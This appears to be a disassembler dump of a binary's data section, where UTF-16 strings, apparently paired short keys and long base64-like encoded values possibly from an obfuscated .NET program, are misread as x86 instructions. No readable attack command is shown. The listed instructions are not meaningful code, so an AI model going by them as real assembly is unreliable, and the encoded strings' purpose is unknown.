10003bdd:	6b 00 45             	imul   $0x45,(%eax),%eax
10003be0:	00 32                	add    %dh,(%edx)
10003be2:	00 61 00             	add    %ah,0x0(%ecx)
10003be5:	47                   	inc    %edi
10003be6:	00 5a 00             	add    %bl,0x0(%edx)
10003be9:	76 00                	jbe    0x10003beb
10003beb:	65 00 54 00 6c       	add    %dl,%gs:0x6c(%eax,%eax,1)
10003bf0:	00 57 00             	add    %dl,0x0(%edi)
10003bf3:	4d                   	dec    %ebp
10003bf4:	00 46 00             	add    %al,0x0(%esi)
10003bf7:	68 00 53 00 56       	push   $0x56005300
10003bfc:	00 45 00             	add    %al,0x0(%ebp)
10003bff:	70 00                	jo     0x10003c01
10003c01:	42                   	inc    %edx
10003c02:	00 4e 00             	add    %cl,0x0(%esi)
10003c05:	6d                   	insl   (%dx),%es:(%edi)
10003c06:	00 68 00             	add    %ch,0x0(%eax)
10003c09:	6d                   	insl   (%dx),%es:(%edi)
10003c0a:	00 62 00             	add    %ah,0x0(%edx)
10003c0d:	33 00                	xor    (%eax),%eax
10003c0f:	6b 00 35             	imul   $0x35,(%eax),%eax
10003c12:	00 55 00             	add    %dl,0x0(%ebp)
10003c15:	6c                   	insb   (%dx),%es:(%edi)
10003c16:	00 52 00             	add    %dl,0x0(%edx)
10003c19:	4b                   	dec    %ebx
10003c1a:	00 51 00             	add    %dl,0x0(%ecx)
10003c1d:	54                   	push   %esp
10003c1e:	00 5a 00             	add    %bl,0x0(%edx)
10003c21:	6f                   	outsl  %ds:(%esi),(%dx)
10003c22:	00 5a 00             	add    %bl,0x0(%edx)
10003c25:	6d                   	insl   (%dx),%es:(%edi)
10003c26:	00 39                	add    %bh,(%ecx)
10003c28:	00 35 00 4f 00 54    	add    %dh,0x54004f00
10003c2e:	00 4e 00             	add    %cl,0x0(%esi)
10003c31:	4b                   	dec    %ebx
10003c32:	00 62 00             	add    %ah,0x0(%edx)
10003c35:	46                   	inc    %esi
10003c36:	00 4a 00             	add    %cl,0x0(%edx)
10003c39:	55                   	push   %ebp
10003c3a:	00 53 00             	add    %dl,0x0(%ebx)
10003c3d:	6b 00 45             	imul   $0x45,(%eax),%eax
10003c40:	00 32                	add    %dh,(%edx)
10003c42:	00 61 00             	add    %ah,0x0(%ecx)
10003c45:	47                   	inc    %edi
10003c46:	00 5a 00             	add    %bl,0x0(%edx)
10003c49:	76 00                	jbe    0x10003c4b
10003c4b:	65 00 54 00 6c       	add    %dl,%gs:0x6c(%eax,%eax,1)
10003c50:	00 53 00             	add    %dl,0x0(%ebx)
10003c53:	56                   	push   %esi
10003c54:	00 45 00             	add    %al,0x0(%ebp)
10003c57:	70 00                	jo     0x10003c59
10003c59:	42                   	inc    %edx
10003c5a:	00 4e 00             	add    %cl,0x0(%esi)
10003c5d:	6d                   	insl   (%dx),%es:(%edi)
10003c5e:	00 68 00             	add    %ch,0x0(%eax)
10003c61:	6d                   	insl   (%dx),%es:(%edi)
10003c62:	00 62 00             	add    %ah,0x0(%edx)
10003c65:	33 00                	xor    (%eax),%eax
10003c67:	6b 00 35             	imul   $0x35,(%eax),%eax
10003c6a:	00 57 00             	add    %dl,0x0(%edi)
10003c6d:	6a 00                	push   $0x0
10003c6f:	4e                   	dec    %esi
10003c70:	00 4f 00             	add    %cl,0x0(%edi)
10003c73:	55                   	push   %ebp
10003c74:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003c78:	00 4b 00             	add    %cl,0x0(%ebx)
10003c7b:	51                   	push   %ecx
10003c7c:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10003c80:	00 6f 00             	add    %ch,0x0(%edi)
10003c83:	5a                   	pop    %edx
10003c84:	00 6d 00             	add    %ch,0x0(%ebp)
10003c87:	39 00                	cmp    %eax,(%eax)
10003c89:	35 00 4f 00 56       	xor    $0x56004f00,%eax
10003c8e:	00 4a 00             	add    %cl,0x0(%edx)
10003c91:	55                   	push   %ebp
10003c92:	00 53 00             	add    %dl,0x0(%ebx)
10003c95:	6b 00 45             	imul   $0x45,(%eax),%eax
10003c98:	00 32                	add    %dh,(%edx)
10003c9a:	00 61 00             	add    %ah,0x0(%ecx)
10003c9d:	47                   	inc    %edi
10003c9e:	00 5a 00             	add    %bl,0x0(%edx)
10003ca1:	76 00                	jbe    0x10003ca3
10003ca3:	65 00 54 00 6c       	add    %dl,%gs:0x6c(%eax,%eax,1)
10003ca8:	00 34 00             	add    %dh,(%eax,%eax,1)
10003cab:	59                   	pop    %ecx
10003cac:	00 6b 00             	add    %ch,0x0(%ebx)
10003caf:	46                   	inc    %esi
10003cb0:	00 53 00             	add    %dl,0x0(%ebx)
10003cb3:	56                   	push   %esi
10003cb4:	00 45 00             	add    %al,0x0(%ebp)
10003cb7:	70 00                	jo     0x10003cb9
10003cb9:	42                   	inc    %edx
10003cba:	00 4e 00             	add    %cl,0x0(%esi)
10003cbd:	6d                   	insl   (%dx),%es:(%edi)
10003cbe:	00 68 00             	add    %ch,0x0(%eax)
10003cc1:	6d                   	insl   (%dx),%es:(%edi)
10003cc2:	00 62 00             	add    %ah,0x0(%edx)
10003cc5:	33 00                	xor    (%eax),%eax
10003cc7:	6b 00 35             	imul   $0x35,(%eax),%eax
10003cca:	00 55 00             	add    %dl,0x0(%ebp)
10003ccd:	6c                   	insb   (%dx),%es:(%edi)
10003cce:	00 52 00             	add    %dl,0x0(%edx)
10003cd1:	4b                   	dec    %ebx
10003cd2:	00 51 00             	add    %dl,0x0(%ecx)
10003cd5:	54                   	push   %esp
10003cd6:	00 5a 00             	add    %bl,0x0(%edx)
10003cd9:	6f                   	outsl  %ds:(%esi),(%dx)
10003cda:	00 5a 00             	add    %bl,0x0(%edx)
10003cdd:	6d                   	insl   (%dx),%es:(%edi)
10003cde:	00 39                	add    %bh,(%ecx)
10003ce0:	00 35 00 4f 00 54    	add    %dh,0x54004f00
10003ce6:	00 30                	add    %dh,(%eax)
10003ce8:	00 39                	add    %bh,(%ecx)
10003cea:	00 55 00             	add    %dl,0x0(%ebp)
10003ced:	6c                   	insb   (%dx),%es:(%edi)
10003cee:	00 52 00             	add    %dl,0x0(%edx)
10003cf1:	4b                   	dec    %ebx
10003cf2:	00 51 00             	add    %dl,0x0(%ecx)
10003cf5:	54                   	push   %esp
10003cf6:	00 5a 00             	add    %bl,0x0(%edx)
10003cf9:	6f                   	outsl  %ds:(%esi),(%dx)
10003cfa:	00 5a 00             	add    %bl,0x0(%edx)
10003cfd:	6d                   	insl   (%dx),%es:(%edi)
10003cfe:	00 39                	add    %bh,(%ecx)
10003d00:	00 35 00 4f 00 51    	add    %dh,0x51004f00
10003d06:	00 3d 00 3d 00 00    	add    %bh,0x3d00
10003d0c:	15 52 00 54 00       	adc    $0x540052,%eax
10003d11:	4a                   	dec    %edx
10003d12:	00 41 00             	add    %al,0x0(%ecx)
10003d15:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
10003d19:	66 00 6f 00          	data16 add %ch,0x0(%edi)
10003d1d:	79 00                	jns    0x10003d1f
10003d1f:	39 00                	cmp    %eax,(%eax)
10003d21:	00 81 b1 4d 00 6e    	add    %al,0x6e004db1(%ecx)
10003d27:	00 68 00             	add    %ch,0x0(%eax)
10003d2a:	42                   	inc    %edx
10003d2b:	00 62 00             	add    %ah,0x0(%edx)
10003d2e:	57                   	push   %edi
10003d2f:	00 52 00             	add    %dl,0x0(%edx)
10003d32:	55                   	push   %ebp
10003d33:	00 56 00             	add    %dl,0x0(%esi)
10003d36:	57                   	push   %edi
10003d37:	00 35 00 44 00 61    	add    %dh,0x61004400
10003d3d:	00 56 00             	add    %dl,0x0(%esi)
10003d40:	6c                   	insb   (%dx),%es:(%edi)
10003d41:	00 59 00             	add    %bl,0x0(%ecx)
10003d44:	54                   	push   %esp
10003d45:	00 6a 00             	add    %ch,0x0(%edx)
10003d48:	4a                   	dec    %edx
10003d49:	00 34 00             	add    %dh,(%eax,%eax,1)
10003d4c:	51                   	push   %ecx
10003d4d:	00 57 00             	add    %dl,0x0(%edi)
10003d50:	31 00                	xor    %eax,(%eax)
10003d52:	6b 00 56             	imul   $0x56,(%eax),%eax
10003d55:	00 46 00             	add    %al,0x0(%esi)
10003d58:	56                   	push   %esi
10003d59:	00 75 00             	add    %dh,0x0(%ebp)
10003d5c:	51                   	push   %ecx
10003d5d:	00 32                	add    %dh,(%edx)
10003d5f:	00 6b 00             	add    %ch,0x0(%ebx)
10003d62:	79 00                	jns    0x10003d64
10003d64:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10003d68:	46                   	inc    %esi
10003d69:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
10003d6d:	00 46 00             	add    %al,0x0(%esi)
10003d70:	52                   	push   %edx
10003d71:	00 56 00             	add    %dl,0x0(%esi)
10003d74:	62 00                	bound  %eax,(%eax)
10003d76:	6b 00 4e             	imul   $0x4e,(%eax),%eax
10003d79:	00 70 00             	add    %dh,0x0(%eax)
10003d7c:	64 00 32             	add    %dh,%fs:(%edx)
10003d7f:	00 4a 00             	add    %cl,0x0(%edx)
10003d82:	74 00                	je     0x10003d84
10003d84:	4d                   	dec    %ebp
10003d85:	00 6e 00             	add    %ch,0x0(%esi)
10003d88:	68 00 42 00 62       	push   $0x62004200
10003d8d:	00 57 00             	add    %dl,0x0(%edi)
10003d90:	52                   	push   %edx
10003d91:	00 55 00             	add    %dl,0x0(%ebp)
10003d94:	56                   	push   %esi
10003d95:	00 57 00             	add    %dl,0x0(%edi)
10003d98:	35 00 44 00 61       	xor    $0x61004400,%eax
10003d9d:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003da1:	00 34 00             	add    %dh,(%eax,%eax,1)
10003da4:	51                   	push   %ecx
10003da5:	00 57 00             	add    %dl,0x0(%edi)
10003da8:	31 00                	xor    %eax,(%eax)
10003daa:	6b 00 56             	imul   $0x56,(%eax),%eax
10003dad:	00 46 00             	add    %al,0x0(%esi)
10003db0:	56                   	push   %esi
10003db1:	00 75 00             	add    %dh,0x0(%ebp)
10003db4:	51                   	push   %ecx
10003db5:	00 32                	add    %dh,(%edx)
10003db7:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
10003dbb:	00 4d 00             	add    %cl,0x0(%ebp)
10003dbe:	46                   	inc    %esi
10003dbf:	00 67 00             	add    %ah,0x0(%edi)
10003dc2:	79 00                	jns    0x10003dc4
10003dc4:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10003dc8:	46                   	inc    %esi
10003dc9:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
10003dcd:	00 46 00             	add    %al,0x0(%esi)
10003dd0:	52                   	push   %edx
10003dd1:	00 56 00             	add    %dl,0x0(%esi)
10003dd4:	62 00                	bound  %eax,(%eax)
10003dd6:	6b 00 4e             	imul   $0x4e,(%eax),%eax
10003dd9:	00 70 00             	add    %dh,0x0(%eax)
10003ddc:	4d                   	dec    %ebp
10003ddd:	00 6e 00             	add    %ch,0x0(%esi)
10003de0:	68 00 42 00 62       	push   $0x62004200
10003de5:	00 57 00             	add    %dl,0x0(%edi)
10003de8:	52                   	push   %edx
10003de9:	00 55 00             	add    %dl,0x0(%ebp)
10003dec:	56                   	push   %esi
10003ded:	00 57 00             	add    %dl,0x0(%edi)
10003df0:	35 00 44 00 61       	xor    $0x61004400,%eax
10003df5:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003df9:	00 4f 00             	add    %cl,0x0(%edi)
10003dfc:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
10003e00:	4a                   	dec    %edx
10003e01:	00 34 00             	add    %dh,(%eax,%eax,1)
10003e04:	51                   	push   %ecx
10003e05:	00 57 00             	add    %dl,0x0(%edi)
10003e08:	31 00                	xor    %eax,(%eax)
10003e0a:	6b 00 56             	imul   $0x56,(%eax),%eax
10003e0d:	00 46 00             	add    %al,0x0(%esi)
10003e10:	56                   	push   %esi
10003e11:	00 75 00             	add    %dh,0x0(%ebp)
10003e14:	51                   	push   %ecx
10003e15:	00 32                	add    %dh,(%edx)
10003e17:	00 6b 00             	add    %ch,0x0(%ebx)
10003e1a:	79 00                	jns    0x10003e1c
10003e1c:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10003e20:	46                   	inc    %esi
10003e21:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
10003e25:	00 46 00             	add    %al,0x0(%esi)
10003e28:	52                   	push   %edx
10003e29:	00 56 00             	add    %dl,0x0(%esi)
10003e2c:	62 00                	bound  %eax,(%eax)
10003e2e:	6b 00 4e             	imul   $0x4e,(%eax),%eax
10003e31:	00 70 00             	add    %dh,0x0(%eax)
10003e34:	59                   	pop    %ecx
10003e35:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10003e39:	00 43 00             	add    %al,0x0(%ebx)
10003e3c:	4d                   	dec    %ebp
10003e3d:	00 6e 00             	add    %ch,0x0(%esi)
10003e40:	68 00 42 00 62       	push   $0x62004200
10003e45:	00 57 00             	add    %dl,0x0(%edi)
10003e48:	52                   	push   %edx
10003e49:	00 55 00             	add    %dl,0x0(%ebp)
10003e4c:	56                   	push   %esi
10003e4d:	00 57 00             	add    %dl,0x0(%edi)
10003e50:	35 00 44 00 61       	xor    $0x61004400,%eax
10003e55:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003e59:	00 34 00             	add    %dh,(%eax,%eax,1)
10003e5c:	51                   	push   %ecx
10003e5d:	00 57 00             	add    %dl,0x0(%edi)
10003e60:	31 00                	xor    %eax,(%eax)
10003e62:	6b 00 56             	imul   $0x56,(%eax),%eax
10003e65:	00 46 00             	add    %al,0x0(%esi)
10003e68:	56                   	push   %esi
10003e69:	00 75 00             	add    %dh,0x0(%ebp)
10003e6c:	51                   	push   %ecx
10003e6d:	00 32                	add    %dh,(%edx)
10003e6f:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
10003e73:	00 59 00             	add    %bl,0x0(%ecx)
10003e76:	6b 00 63             	imul   $0x63,(%eax),%eax
10003e79:	00 79 00             	add    %bh,0x0(%ecx)
10003e7c:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10003e80:	46                   	inc    %esi
10003e81:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
10003e85:	00 46 00             	add    %al,0x0(%esi)
10003e88:	52                   	push   %edx
10003e89:	00 56 00             	add    %dl,0x0(%esi)
10003e8c:	62 00                	bound  %eax,(%eax)
10003e8e:	6b 00 4e             	imul   $0x4e,(%eax),%eax
10003e91:	00 70 00             	add    %dh,0x0(%eax)
10003e94:	4d                   	dec    %ebp
10003e95:	00 6e 00             	add    %ch,0x0(%esi)
10003e98:	68 00 42 00 62       	push   $0x62004200
10003e9d:	00 57 00             	add    %dl,0x0(%edi)
10003ea0:	52                   	push   %edx
10003ea1:	00 55 00             	add    %dl,0x0(%ebp)
10003ea4:	56                   	push   %esi
10003ea5:	00 57 00             	add    %dl,0x0(%edi)
10003ea8:	35 00 44 00 61       	xor    $0x61004400,%eax
10003ead:	00 56 00             	add    %dl,0x0(%esi)
10003eb0:	5a                   	pop    %edx
10003eb1:	00 35 00 4d 00 6e    	add    %dh,0x6e004d00
10003eb7:	00 68 00             	add    %ch,0x0(%eax)
10003eba:	42                   	inc    %edx
10003ebb:	00 62 00             	add    %ah,0x0(%edx)
10003ebe:	57                   	push   %edi
10003ebf:	00 52 00             	add    %dl,0x0(%edx)
10003ec2:	55                   	push   %ebp
10003ec3:	00 56 00             	add    %dl,0x0(%esi)
10003ec6:	57                   	push   %edi
10003ec7:	00 35 00 44 00 61    	add    %dh,0x61004400
10003ecd:	00 51 00             	add    %dl,0x0(%ecx)
10003ed0:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10003ed5:	15 32 00 78 00       	adc    $0x780032,%eax
10003eda:	41                   	inc    %ecx
10003edb:	00 6d 00             	add    %ch,0x0(%ebp)
10003ede:	64 00 54 00 55       	add    %dl,%fs:0x55(%eax,%eax,1)
10003ee3:	00 6e 00             	add    %ch,0x0(%esi)
10003ee6:	43                   	inc    %ebx
10003ee7:	00 69 00             	add    %ch,0x0(%ecx)
10003eea:	00 80 b9 4e 00 32    	add    %al,0x32004eb9(%eax)
10003ef0:	00 4e 00             	add    %cl,0x0(%esi)
10003ef3:	69 00 65 00 47 00    	imul   $0x470065,(%eax),%eax
10003ef9:	39 00                	cmp    %eax,(%eax)
10003efb:	4b                   	dec    %ebx
10003efc:	00 5a 00             	add    %bl,0x0(%edx)
10003eff:	54                   	push   %esp
10003f00:	00 52 00             	add    %dl,0x0(%edx)
10003f03:	68 00 52 00 6c       	push   $0x6c005200
10003f08:	00 56 00             	add    %dl,0x0(%esi)
10003f0b:	74 00                	je     0x10003f0d
10003f0d:	56                   	push   %esi
10003f0e:	00 6a 00             	add    %ch,0x0(%edx)
10003f11:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
10003f15:	59                   	pop    %ecx
10003f16:	00 6e 00             	add    %ch,0x0(%esi)
10003f19:	68 00 76 00 53       	push   $0x53007600
10003f1e:	00 6d 00             	add    %ch,0x0(%ebp)
10003f21:	55                   	push   %ebp
10003f22:	00 30                	add    %dh,(%eax)
10003f24:	00 59 00             	add    %bl,0x0(%ecx)
10003f27:	55                   	push   %ebp
10003f28:	00 59 00             	add    %bl,0x0(%ecx)
10003f2b:	33 00                	xor    (%eax),%eax
10003f2d:	59                   	pop    %ecx
10003f2e:	00 32                	add    %dh,(%edx)
10003f30:	00 4a 00             	add    %cl,0x0(%edx)
10003f33:	34 00                	xor    $0x0,%al
10003f35:	62 00                	bound  %eax,(%eax)
10003f37:	30 00                	xor    %al,(%eax)
10003f39:	70 00                	jo     0x10003f3b
10003f3b:	6c                   	insb   (%dx),%es:(%edi)
10003f3c:	00 4e 00             	add    %cl,0x0(%esi)
10003f3f:	47                   	inc    %edi
10003f40:	00 46 00             	add    %al,0x0(%esi)
10003f43:	47                   	inc    %edi
10003f44:	00 62 00             	add    %ah,0x0(%edx)
10003f47:	6c                   	insb   (%dx),%es:(%edi)
10003f48:	00 46 00             	add    %al,0x0(%esi)
10003f4b:	59                   	pop    %ecx
10003f4c:	00 4e 00             	add    %cl,0x0(%esi)
10003f4f:	32 00                	xor    (%eax),%al
10003f51:	4e                   	dec    %esi
10003f52:	00 69 00             	add    %ch,0x0(%ecx)
10003f55:	65 00 47 00          	add    %al,%gs:0x0(%edi)
10003f59:	39 00                	cmp    %eax,(%eax)
10003f5b:	4b                   	dec    %ebx
10003f5c:	00 5a 00             	add    %bl,0x0(%edx)
10003f5f:	54                   	push   %esp
10003f60:	00 52 00             	add    %dl,0x0(%edx)
10003f63:	68 00 52 00 6a       	push   $0x6a005200
10003f68:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
10003f6c:	00 59 00             	add    %bl,0x0(%ecx)
10003f6f:	6e                   	outsb  %ds:(%esi),(%dx)
10003f70:	00 68 00             	add    %ch,0x0(%eax)
10003f73:	76 00                	jbe    0x10003f75
10003f75:	53                   	push   %ebx
10003f76:	00 6d 00             	add    %ch,0x0(%ebp)
10003f79:	55                   	push   %ebp
10003f7a:	00 30                	add    %dh,(%eax)
10003f7c:	00 59 00             	add    %bl,0x0(%ecx)
10003f7f:	55                   	push   %ebp
10003f80:	00 5a 00             	add    %bl,0x0(%edx)
10003f83:	4f                   	dec    %edi
10003f84:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
10003f88:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
10003f8c:	00 59 00             	add    %bl,0x0(%ecx)
10003f8f:	6e                   	outsb  %ds:(%esi),(%dx)
10003f90:	00 68 00             	add    %ch,0x0(%eax)
10003f93:	76 00                	jbe    0x10003f95
10003f95:	53                   	push   %ebx
10003f96:	00 6d 00             	add    %ch,0x0(%ebp)
10003f99:	55                   	push   %ebp
10003f9a:	00 30                	add    %dh,(%eax)
10003f9c:	00 59 00             	add    %bl,0x0(%ecx)
10003f9f:	55                   	push   %ebp
10003fa0:	00 59 00             	add    %bl,0x0(%ecx)
10003fa3:	3d 00 00 15 37       	cmp    $0x37150000,%eax
10003fa8:	00 63 00             	add    %ah,0x0(%ebx)
10003fab:	62 00                	bound  %eax,(%eax)
10003fad:	78 00                	js     0x10003faf
10003faf:	6f                   	outsl  %ds:(%esi),(%dx)
10003fb0:	00 4a 00             	add    %cl,0x0(%edx)
10003fb3:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
10003fb7:	61                   	popa
10003fb8:	00 46 00             	add    %al,0x0(%esi)
10003fbb:	00 80 b9 51 00 7a    	add    %al,0x7a0051b9(%eax)
10003fc1:	00 5a 00             	add    %bl,0x0(%edx)
10003fc4:	55                   	push   %ebp
10003fc5:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
10003fc9:	00 4e 00             	add    %cl,0x0(%esi)
10003fcc:	55                   	push   %ebp
10003fcd:	00 63 00             	add    %ah,0x0(%ebx)
10003fd0:	48                   	dec    %eax
10003fd1:	00 70 00             	add    %dh,0x0(%eax)
10003fd4:	44                   	inc    %esp
10003fd5:	00 62 00             	add    %ah,0x0(%edx)
10003fd8:	57                   	push   %edi
10003fd9:	00 46 00             	add    %al,0x0(%esi)
10003fdc:	58                   	pop    %eax
10003fdd:	00 65 00             	add    %ah,0x0(%ebp)
10003fe0:	45                   	inc    %ebp
10003fe1:	00 4d 00             	add    %cl,0x0(%ebp)
10003fe4:	32 00                	xor    (%eax),%al
10003fe6:	56                   	push   %esi
10003fe7:	00 45 00             	add    %al,0x0(%ebp)
10003fea:	31 00                	xor    %eax,(%eax)
10003fec:	6a 00                	push   $0x0
10003fee:	56                   	push   %esi
10003fef:	00 48 00             	add    %cl,0x0(%eax)
10003ff2:	42                   	inc    %edx
10003ff3:	00 36                	add    %dh,(%esi)
10003ff5:	00 51 00             	add    %dl,0x0(%ecx)
10003ff8:	32 00                	xor    (%eax),%al
10003ffa:	31 00                	xor    %eax,(%eax)
10003ffc:	44                   	inc    %esp
10003ffd:	00 4e 00             	add    %cl,0x0(%esi)
10004000:	6c                   	insb   (%dx),%es:(%edi)
10004001:	00 52 00             	add    %dl,0x0(%edx)
10004004:	4e                   	dec    %esi
10004005:	00 59 00             	add    %bl,0x0(%ecx)
10004008:	31 00                	xor    %eax,(%eax)
1000400a:	52                   	push   %edx
1000400b:	00 77 00             	add    %dh,0x0(%edi)
1000400e:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
10004012:	4e                   	dec    %esi
10004013:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
10004017:	00 47 00             	add    %al,0x0(%edi)
1000401a:	4d                   	dec    %ebp
1000401b:	00 79 00             	add    %bh,0x0(%ecx)
1000401e:	51                   	push   %ecx
1000401f:	00 7a 00             	add    %bh,0x0(%edx)
10004022:	5a                   	pop    %edx
10004023:	00 55 00             	add    %dl,0x0(%ebp)
10004026:	54                   	push   %esp
10004027:	00 57 00             	add    %dl,0x0(%edi)
1000402a:	4e                   	dec    %esi
1000402b:	00 55 00             	add    %dl,0x0(%ebp)
1000402e:	63 00                	arpl   %eax,(%eax)
10004030:	48                   	dec    %eax
10004031:	00 70 00             	add    %dh,0x0(%eax)
10004034:	44                   	inc    %esp
10004035:	00 62 00             	add    %ah,0x0(%edx)
10004038:	55                   	push   %ebp
10004039:	00 4d 00             	add    %cl,0x0(%ebp)
1000403c:	32 00                	xor    (%eax),%al
1000403e:	56                   	push   %esi
1000403f:	00 45 00             	add    %al,0x0(%ebp)
10004042:	31 00                	xor    %eax,(%eax)
10004044:	6a 00                	push   $0x0
10004046:	56                   	push   %esi
10004047:	00 48 00             	add    %cl,0x0(%eax)
1000404a:	42                   	inc    %edx
1000404b:	00 36                	add    %dh,(%esi)
1000404d:	00 51 00             	add    %dl,0x0(%ecx)
10004050:	32 00                	xor    (%eax),%al
10004052:	30 00                	xor    %al,(%eax)
10004054:	77 00                	ja     0x10004056
10004056:	50                   	push   %eax
10004057:	00 55 00             	add    %dl,0x0(%ebp)
1000405a:	4d                   	dec    %ebp
1000405b:	00 32                	add    %dh,(%edx)
1000405d:	00 56 00             	add    %dl,0x0(%esi)
10004060:	45                   	inc    %ebp
10004061:	00 31                	add    %dh,(%ecx)
10004063:	00 6a 00             	add    %ch,0x0(%edx)
10004066:	56                   	push   %esi
10004067:	00 48 00             	add    %cl,0x0(%eax)
1000406a:	42                   	inc    %edx
1000406b:	00 36                	add    %dh,(%esi)
1000406d:	00 51 00             	add    %dl,0x0(%ecx)
10004070:	32 00                	xor    (%eax),%al
10004072:	30 00                	xor    %al,(%eax)
10004074:	3d 00 00 15 43       	cmp    $0x43150000,%eax
10004079:	00 36                	add    %dh,(%esi)
1000407b:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
1000407f:	00 63 00             	add    %ah,0x0(%ebx)
10004082:	54                   	push   %esp
10004083:	00 70 00             	add    %dh,0x0(%eax)
10004086:	7a 00                	jp     0x10004088
10004088:	43                   	inc    %ebx
10004089:	00 6d 00             	add    %ch,0x0(%ebp)
1000408c:	00 80 f9 62 00 7a    	add    %al,0x7a0062f9(%eax)
10004092:	00 68 00             	add    %ch,0x0(%eax)
10004095:	47                   	inc    %edi
10004096:	00 57 00             	add    %dl,0x0(%edi)
10004099:	46                   	inc    %esi
1000409a:	00 5a 00             	add    %bl,0x0(%edx)
1000409d:	79 00                	jns    0x1000409f
1000409f:	51                   	push   %ecx
100040a0:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
100040a4:	00 31                	add    %dh,(%ecx)
100040a6:	00 4e 00             	add    %cl,0x0(%esi)
100040a9:	6c                   	insb   (%dx),%es:(%edi)
100040aa:	00 46 00             	add    %al,0x0(%esi)
100040ad:	59                   	pop    %ecx
100040ae:	00 51 00             	add    %dl,0x0(%ecx)
100040b1:	6d                   	insl   (%dx),%es:(%edi)
100040b2:	00 38                	add    %bh,(%eax)
100040b4:	00 34 00             	add    %dh,(%eax,%eax,1)
100040b7:	52                   	push   %edx
100040b8:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
100040bc:	00 57 00             	add    %dl,0x0(%edi)
100040bf:	63 00                	arpl   %eax,(%eax)
100040c1:	6b 00 45             	imul   $0x45,(%eax),%eax
100040c4:	00 77 00             	add    %dh,0x0(%edi)
100040c7:	64 00 54 00 5a       	add    %dl,%fs:0x5a(%eax,%eax,1)
100040cc:	00 76 00             	add    %dh,0x0(%esi)
100040cf:	4f                   	dec    %edi
100040d0:	00 45 00             	add    %al,0x0(%ebp)
100040d3:	5a                   	pop    %edx
100040d4:	00 59 00             	add    %bl,0x0(%ecx)
100040d7:	56                   	push   %esi
100040d8:	00 6e 00             	add    %ch,0x0(%esi)
100040db:	4a                   	dec    %edx
100040dc:	00 42 00             	add    %al,0x0(%edx)
100040df:	4d                   	dec    %ebp
100040e0:	00 48 00             	add    %cl,0x0(%eax)
100040e3:	55                   	push   %ebp
100040e4:	00 32                	add    %dh,(%edx)
100040e6:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
100040ea:	00 52 00             	add    %dl,0x0(%edx)
100040ed:	48                   	dec    %eax
100040ee:	00 62 00             	add    %ah,0x0(%edx)
100040f1:	7a 00                	jp     0x100040f3
100040f3:	68 00 47 00 57       	push   $0x57004700
100040f8:	00 46 00             	add    %al,0x0(%esi)
100040fb:	5a                   	pop    %edx
100040fc:	00 79 00             	add    %bh,0x0(%ecx)
100040ff:	51                   	push   %ecx
10004100:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
10004104:	00 31                	add    %dh,(%ecx)
10004106:	00 4e 00             	add    %cl,0x0(%esi)
10004109:	6d                   	insl   (%dx),%es:(%edi)
1000410a:	00 38                	add    %bh,(%eax)
1000410c:	00 34 00             	add    %dh,(%eax,%eax,1)
1000410f:	52                   	push   %edx
10004110:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10004114:	00 57 00             	add    %dl,0x0(%edi)
10004117:	63 00                	arpl   %eax,(%eax)
10004119:	6b 00 45             	imul   $0x45,(%eax),%eax
1000411c:	00 77 00             	add    %dh,0x0(%edi)
1000411f:	64 00 54 00 5a       	add    %dl,%fs:0x5a(%eax,%eax,1)
10004124:	00 47 00             	add    %al,0x0(%edi)
10004127:	4d                   	dec    %ebp
10004128:	00 57 00             	add    %dl,0x0(%edi)
1000412b:	4a                   	dec    %edx
1000412c:	00 76 00             	add    %dh,0x0(%esi)
1000412f:	4f                   	dec    %edi
10004130:	00 45 00             	add    %al,0x0(%ebp)
10004133:	5a                   	pop    %edx
10004134:	00 59 00             	add    %bl,0x0(%ecx)
10004137:	56                   	push   %esi
10004138:	00 6e 00             	add    %ch,0x0(%esi)
1000413b:	4a                   	dec    %edx
1000413c:	00 42 00             	add    %al,0x0(%edx)
1000413f:	4d                   	dec    %ebp
10004140:	00 48 00             	add    %cl,0x0(%eax)
10004143:	55                   	push   %ebp
10004144:	00 32                	add    %dh,(%edx)
10004146:	00 62 00             	add    %ah,0x0(%edx)
10004149:	7a 00                	jp     0x1000414b
1000414b:	68 00 47 00 57       	push   $0x57004700
10004150:	00 46 00             	add    %al,0x0(%esi)
10004153:	5a                   	pop    %edx
10004154:	00 79 00             	add    %bh,0x0(%ecx)
10004157:	51                   	push   %ecx
10004158:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
1000415c:	00 31                	add    %dh,(%ecx)
1000415e:	00 4e 00             	add    %cl,0x0(%esi)
10004161:	6d                   	insl   (%dx),%es:(%edi)
10004162:	00 31                	add    %dh,(%ecx)
10004164:	00 4f 00             	add    %cl,0x0(%edi)
10004167:	62 00                	bound  %eax,(%eax)
10004169:	32 00                	xor    (%eax),%al
